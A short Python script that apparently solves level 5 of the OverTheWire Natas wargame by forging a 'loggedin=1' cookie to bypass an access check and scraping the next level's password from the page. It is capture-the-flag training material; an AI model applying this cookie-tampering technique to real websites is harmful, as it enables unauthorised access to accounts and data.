import requests
import re
from requests.auth import HTTPBasicAuth
def solve5(username, password):
    session = requests.session()
    session.auth = HTTPBasicAuth(username, password)
    session.cookies["loggedin"] = "1"
    resp = session.get("http://natas5.natas.labs.overthewire.org/")
    pw = re.findall(r'[a-zA-Z0-9]{32}', resp.text)[-1]
    return pw
